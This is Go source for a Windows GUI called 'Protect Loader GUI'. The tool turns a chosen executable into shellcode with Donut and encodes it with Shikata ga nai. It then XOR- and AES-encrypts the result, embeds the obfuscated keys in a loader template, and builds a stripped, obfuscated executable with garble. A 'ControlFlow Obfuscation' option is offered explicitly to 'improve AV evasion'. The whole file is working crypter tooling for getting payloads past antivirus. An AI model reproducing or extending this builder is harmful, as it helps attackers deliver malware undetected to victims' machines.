package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/sqweek/dialog"
	"image/color"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"main/utils/controlflow"
)

var (
	user32          = syscall.NewLazyDLL("user32.dll")
	procMessageBoxW = user32.NewProc("MessageBoxW")
)

type customTheme struct{}

type Config struct {
	ControlFlowEnabled bool `json:"control_flow_enabled"`
}

const (
	MB_ICONWARNING = 0x30
	MB_YESNO       = 0x04
	IDYES          = 6
)

func (t customTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color {
	switch name {
	case theme.ColorNameBackground:
		return color.NRGBA{R: 25, G: 25, B: 25, A: 255}
	case theme.ColorNameForeground:
		return color.White
	case theme.ColorNameButton:
		return color.NRGBA{R: 0, G: 0, B: 0, A: 0}
	default:
		return theme.DefaultTheme().Color(name, variant)
	}
}

func (t customTheme) Font(style fyne.TextStyle) fyne.Resource {
	return theme.DefaultTheme().Font(style)
}

func (t customTheme) Icon(name fyne.ThemeIconName) fyne.Resource {
	return theme.DefaultTheme().Icon(name)
}

func (t customTheme) Size(name fyne.ThemeSizeName) float32 {
	return theme.DefaultTheme().Size(name)
}

func messageBox(title, text string, style uintptr) int {
	ret, _, _ := procMessageBoxW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		style)
	return int(ret)
}

func hideConsoleWindow() {
	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var getConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	var showWindow = syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	const SW_HIDE = 0
	showWindow.Call(hwnd, uintptr(SW_HIDE))
}

func saveConfig(config Config) error {
	file, err := os.Create("config.json")
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	return encoder.Encode(config)
}

func loadConfig() (Config, error) {
	var config Config
	file, err := os.Open("config.json")
	if err != nil {
		if os.IsNotExist(err) {
			config = Config{ControlFlowEnabled: false}
			err = saveConfig(config)
			if err != nil {
				return config, fmt.Errorf("[-] failed to create config file: %v", err)
			}
			return config, nil
		}
		return config, err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		if err == io.EOF {
			config = Config{ControlFlowEnabled: false}
			err = saveConfig(config)
			if err != nil {
				return config, fmt.Errorf("[-] failed to save default config: %v", err)
			}
			return config, nil
		}
		return config, err
	}
	return config, nil
}

func createGUI() fyne.Window {
	a := app.New()
	a.Settings().SetTheme(&customTheme{})
	w := a.NewWindow("Protect Loader GUI")
	w.Resize(fyne.NewSize(800, 400))

	title := widget.NewLabelWithStyle("Protect Loader GUI", fyne.TextAlignLeading, fyne.TextStyle{Bold: true})

	logo := canvas.NewImageFromFile("Assets/LOGO.png")
	logo.SetMinSize(fyne.NewSize(500, 280))
	logo.FillMode = canvas.ImageFillContain

	logoBg := canvas.NewRectangle(color.NRGBA{R: 0, G: 0, B: 0, A: 0})
	logoBg.CornerRadius = 24
	logoBg.SetMinSize(fyne.NewSize(500, 250))

	logoContainer := container.NewMax(logoBg, logo)

	statusLabel := widget.NewLabel("[+] Status: Waiting for action")
	logLabel := widget.NewLabel("[+] Log information will be displayed here...")
	scrollableLog := container.NewScroll(logLabel)
	scrollableLog.SetMinSize(fyne.NewSize(300, 400))

	fileEntry := widget.NewEntry()
	fileEntry.SetPlaceHolder("Click to select your PE File...")
	fileEntry.Disable()

	selectFileButton := widget.NewButton("Select File", func() {
		selectFile(fileEntry, statusLabel, logLabel, scrollableLog)
	})

	encryptButton := widget.NewButton("Encrypt and Build", func() {
		encryptFile(fileEntry.Text, statusLabel, logLabel, scrollableLog)
	})

	optionButton := widget.NewButton("Select Feature", func() {
		optionsWindow := fyne.CurrentApp().NewWindow("Select Feature")
		optionsWindow.Resize(fyne.NewSize(300, 200))

		exteriorRect := canvas.NewRectangle(color.NRGBA{R: 15, G: 15, B: 15, A: 255})
		exteriorRect.CornerRadius = 16
		exteriorRect.SetMinSize(fyne.NewSize(300, 200))

		interiorRect := canvas.NewRectangle(color.NRGBA{R: 25, G: 25, B: 25, A: 255})
		interiorRect.CornerRadius = 12
		interiorRect.SetMinSize(fyne.NewSize(280, 180))

		var option1Checkbox *widget.Check

		config, err := loadConfig()
		if err != nil {
			log.Fatalf("Failed to load config: %v", err)
		}

		option1Checkbox = widget.NewCheck("ControlFlow Obfuscation", func(checked bool) {
			if checked && !config.ControlFlowEnabled {
				result := messageBox("Warning", "Are you sure you want to enable ControlFlow Obfuscation? It will increase the delay execution but will improve AV evasion", MB_ICONWARNING|MB_YESNO)
				if result == IDYES {
					statusLabel.SetText("[+] Feature selected and Activated: ControlFlow")
					err := ControlFlow.EnableControlflow(logLabel)
					if err != nil {
						logLabel.SetText(fmt.Sprintf("[-] Error enabling ControlFlow: %v", err))
						option1Checkbox.SetChecked(false)
					} else {
						config.ControlFlowEnabled = true
					}
				} else {
					option1Checkbox.SetChecked(false)
					config.ControlFlowEnabled = false
				}
			} else if !checked {
				err := ControlFlow.DisableControlflow(logLabel)
				if err != nil {
					logLabel.SetText(fmt.Sprintf("[-] Error disabling ControlFlow: %v", err))
				}
				statusLabel.SetText("[+] Feature has been disabled by user: ControlFlow")
				config.ControlFlowEnabled = false
			}

			err := saveConfig(config)
			if err != nil {
				logLabel.SetText(fmt.Sprintf("Error saving config: %v", err))
			}
		})
		option1Checkbox.SetChecked(config.ControlFlowEnabled)

		var option2Checkbox *widget.Check
		option2Checkbox = widget.NewCheck("WIP", func(checked bool) {
			if checked {
				statusLabel.SetText("[+] Feature selected: WIP")
				//WIP
			}
		})

		var option3Checkbox *widget.Check
		option3Checkbox = widget.NewCheck("WIP", func(checked bool) {
			if checked {
				statusLabel.SetText("[+] Feature selected: WIP")
				//WIP
			}
		})

		optionsContent := container.NewVBox(
			container.NewCenter(option1Checkbox),
			container.NewCenter(option2Checkbox),
			container.NewCenter(option3Checkbox),
		)

		interiorContainer := container.NewPadded(
			container.NewMax(
				interiorRect,
				optionsContent,
			),
		)

		finalContent := container.NewMax(
			exteriorRect,
			interiorContainer,
		)

		optionsWindow.SetContent(finalContent)
		optionsWindow.Show()
	})

	leftPanel := container.NewVBox(
		container.NewPadded(title),
		layout.NewSpacer(),
		container.NewCenter(logoContainer),
		fileEntry,
		selectFileButton,
		encryptButton,
		optionButton,
		statusLabel,
		layout.NewSpacer(),
	)
	leftBg := canvas.NewRectangle(color.NRGBA{R: 15, G: 15, B: 15, A: 255})
	leftBg.CornerRadius = 12
	leftBg.SetMinSize(fyne.NewSize(200, 400))

	topRightContainer := rightpanel(scrollableLog)

	content := container.NewHBox(
		container.NewMax(leftBg, container.NewPadded(leftPanel)),
		topRightContainer,
	)

	mainContainer := container.NewPadded(content)
	w.SetContent(mainContainer)
	return w
}

func rightpanel(scrollableLog *container.Scroll) *fyne.Container {
	rightpanelexterior := canvas.NewRectangle(color.NRGBA{R: 15, G: 15, B: 15, A: 255})
	rightpanelexterior.CornerRadius = 16
	rightpanelexterior.SetMinSize(fyne.NewSize(500, 300))

	rightinteriorpanel := canvas.NewRectangle(color.NRGBA{R: 25, G: 25, B: 25, A: 255})
	rightinteriorpanel.CornerRadius = 12

	innerContainer := container.NewPadded(
		container.NewMax(
			rightinteriorpanel,
			scrollableLog,
		),
	)

	rightpanel := container.NewMax(
		rightpanelexterior,
		container.NewPadded(innerContainer),
	)

	borderRect := canvas.NewRectangle(color.NRGBA{R: 30, G: 30, B: 30, A: 255})
	borderRect.StrokeWidth = 1
	borderRect.StrokeColor = color.NRGBA{R: 40, G: 40, B: 40, A: 255}
	borderRect.CornerRadius = 16

	finalrightpanel := container.NewMax(
		borderRect,
		rightpanel,
	)
	return finalrightpanel
}

func selectFile(fileEntry *widget.Entry, statusLabel, logLabel *widget.Label, scrollableLog *container.Scroll) {
	filename, err := dialog.File().Title("Select File").Load()
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to open file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to open file: %v\n", err))
		return
	}
	fileEntry.SetText(filename)
	statusLabel.SetText("[+] File selected: " + filename)
	scrollableLog.ScrollToBottom()
}

func encryptFile(filename string, statusLabel, logLabel *widget.Label, scrollableLog *container.Scroll) {
	if filename == "" {
		statusLabel.SetText("[-] No file selected")
		logLabel.SetText("[-] No file selected\n")
		return
	}

	if err := runCommand("./Donut/donut.exe", "-e", "3", "-z", "4", "-b", "3", "-k", "2", "-i", filename); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to run Donut: %v\n", err))
		return
	}
	logLabel.SetText(logLabel.Text + "[+] Donut transformation successful\n")

	binFile := "loader.bin"
	shellcodeFile := "Shikata_ga_nai/shellcode.bin"
	if err := runCommand("./Shikata_ga_nai/sgn32.exe", "-i", binFile, "-o", shellcodeFile); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to run Shikata ga nai: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to run Shikata ga nai: %v\n", err))
		return
	}
	logLabel.SetText(logLabel.Text + "[+] Shikata ga nai encoding successful\n")

	plaintext, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to read shellcode file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to read shellcode file: %v\n", err))
		return
	}
	encryptData(plaintext, statusLabel, logLabel)
	scrollableLog.ScrollToBottom()

	cleanupFiles([]string{binFile, shellcodeFile}, logLabel)

	logLabel.SetText(logLabel.Text + "[+] Building final executable...\n")
	buildmain()
	logLabel.SetText(logLabel.Text + "[+] Final executable built successfully\n")
	if err := os.Chdir("GUI"); err != nil {
		logLabel.SetText(logLabel.Text + fmt.Sprintf("[-] Failed go in the prevouis path: %v\n", err))
	}
	logLabel.SetText(logLabel.Text + "[+] Ready to Build Again !\n")
}

func buildmain() error {
	if err := os.Chdir(".."); err != nil {
		return err
	}
	return runCommand("garble", "-literals", "-seed=random", "-tiny", "build", "-ldflags=-w -s -H=windowsgui -buildid=", "-trimpath", "-o", "Protect_Loader.exe")
}

func runCommand(name string, arg ...string) error {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func cleanupFiles(files []string, logLabel *widget.Label) {
	for _, file := range files {
		if err := os.Remove(file); err != nil {
			logLabel.SetText(logLabel.Text + fmt.Sprintf("[-] Failed to delete file %s: %v\n", file, err))
		} else {
			logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Deleted file %s\n", file))
		}
	}
}

func encryptKeys(aesKeyHex, xorKeyHex, encryptionKey string) (string, string, error) {
	encryptionKeyBytes, err := hex.DecodeString(encryptionKey)
	if err != nil {
		return "", "", fmt.Errorf("failed to decode encryption key: %v", err)
	}

	encryptedAESKey, err := xorEncrypt([]byte(aesKeyHex), encryptionKeyBytes)
	if err != nil {
		return "", "", fmt.Errorf("failed to encrypt AES key: %v", err)
	}

	encryptedXORKey, err := xorEncrypt([]byte(xorKeyHex), encryptionKeyBytes)
	if err != nil {
		return "", "", fmt.Errorf("failed to encrypt XOR key: %v", err)
	}

	return hex.EncodeToString(encryptedAESKey), hex.EncodeToString(encryptedXORKey), nil
}

func encryptData(plaintext []byte, statusLabel *widget.Label, logLabel *widget.Label) {
	aesKey, aesKeyHex, err := generateKey(32)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to generate AES key: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to generate AES key: %v\n", err))
		return
	}
	logLabel.SetText(logLabel.Text + "[+] AES key generated successfully: " + aesKeyHex + "\n")

	xorKey, xorKeyHex, err := generateKey(16)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to generate XOR key: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to generate XOR key: %v\n", err))
		return
	}
	logLabel.SetText(logLabel.Text + "[+] XOR key generated successfully: " + xorKeyHex + "\n")

	xorEncrypted, err := xorEncrypt(plaintext, xorKey)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] XOR encryption failed: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] XOR encryption failed: %v\n", err))
		return
	}
	statusLabel.SetText("[+] XOR encryption successful")
	logLabel.SetText(logLabel.Text + "[+] XOR encryption successful\n")

	aesEncrypted, err := aesEncrypt(xorEncrypted, aesKey)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] AES encryption failed: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] AES encryption failed: %v\n", err))
		return
	}
	statusLabel.SetText("[+] AES encryption successful")
	logLabel.SetText(logLabel.Text + "[+] AES encryption successful\n")

	if err := ioutil.WriteFile("../encrypted_loader.bin", aesEncrypted, 0644); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to write encrypted data to file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to write encrypted data to file: %v\n", err))
		return
	}

	statusLabel.SetText("[+] Encryption successful and saved to ../encrypted_loader.bin")
	logLabel.SetText(logLabel.Text + "[+] Encryption successful and saved to ../encrypted_loader.bin\n")

	_, reEncryptKeyHex, err := generateKey(16)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to generate re-encryption key: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to generate re-encryption key: %v\n", err))
		return
	}

	encryptedAESKey, encryptedXORKey, err := encryptKeys(aesKeyHex, xorKeyHex, reEncryptKeyHex)
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to encrypt keys: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to encrypt keys: %v\n", err))
		return
	}
	logLabel.SetText(logLabel.Text + "[+] Keys encrypted successfully\n")

	logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Length of AES key: %d\n", len(aesKey)))
	logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Length of XOR key: %d\n", len(xorKey)))

	logLabel.SetText(logLabel.Text + "[+] Encrypted AES Key: " + encryptedAESKey + "\n")
	logLabel.SetText(logLabel.Text + "[+] Encrypted XOR Key: " + encryptedXORKey + "\n")
	logLabel.SetText(logLabel.Text + "[+] Encryption Key of XOR: " + reEncryptKeyHex + "\n")

	replaceKeysInTemplate(encryptedAESKey, encryptedXORKey, reEncryptKeyHex, statusLabel, logLabel)
}

func generateKey(length int) ([]byte, string, error) {
	key := make([]byte, length)
	if _, err := rand.Read(key); err != nil {
		return nil, "", err
	}
	return key, fmt.Sprintf("%x", key), nil
}

func replaceKeysInTemplate(encryptedAESKey, encryptedXORKey, reEncryptKeyHex string, statusLabel, logLabel *widget.Label) {
	templateContent, err := ioutil.ReadFile("../template.txt")
	if err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to read template file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to read template file: %v\n", err))
		return
	}

	logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Length of encrypted AES key: %d\n", len(encryptedAESKey)))
	logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Length of encrypted XOR key: %d\n", len(encryptedXORKey)))
	logLabel.SetText(logLabel.Text + fmt.Sprintf("[+] Length of re-encryption key: %d\n", len(reEncryptKeyHex)))

	replacements := map[string]string{
		"%KEYAES%":    encryptedAESKey,
		"%KEYXOR%":    encryptedXORKey,
		"%XORAESKEY%": reEncryptKeyHex,
	}

	mainContent := string(templateContent)
	for placeholder, value := range replacements {
		mainContent = strings.ReplaceAll(mainContent, placeholder, value)
	}

	if err := ioutil.WriteFile("../main.go", []byte(mainContent), 0644); err != nil {
		statusLabel.SetText(fmt.Sprintf("[-] Failed to write main.go file: %v", err))
		logLabel.SetText(fmt.Sprintf("[-] Failed to write main.go file: %v\n", err))
		return
	}

	statusLabel.SetText("[+] main.go file created and keys replaced successfully")
	logLabel.SetText(logLabel.Text + "[+] main.go file created and keys replaced successfully\n")
}

func aesEncrypt(plaintext, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("[-] invalid AES key length: must be 32 bytes (AES-256)")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("[-] failed to create AES cipher: %v", err)
	}
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("[-] failed to generate IV: %v", err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
	return ciphertext, nil
}

func xorEncrypt(data, key []byte) ([]byte, error) {
	keyLen := len(key)
	if keyLen == 0 {
		return nil, fmt.Errorf("[-] invalid XOR key length: key cannot be empty")
	}
	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}
	return data, nil
}

func main() {
	hideConsoleWindow()
	w := createGUI()
	w.ShowAndRun()
}
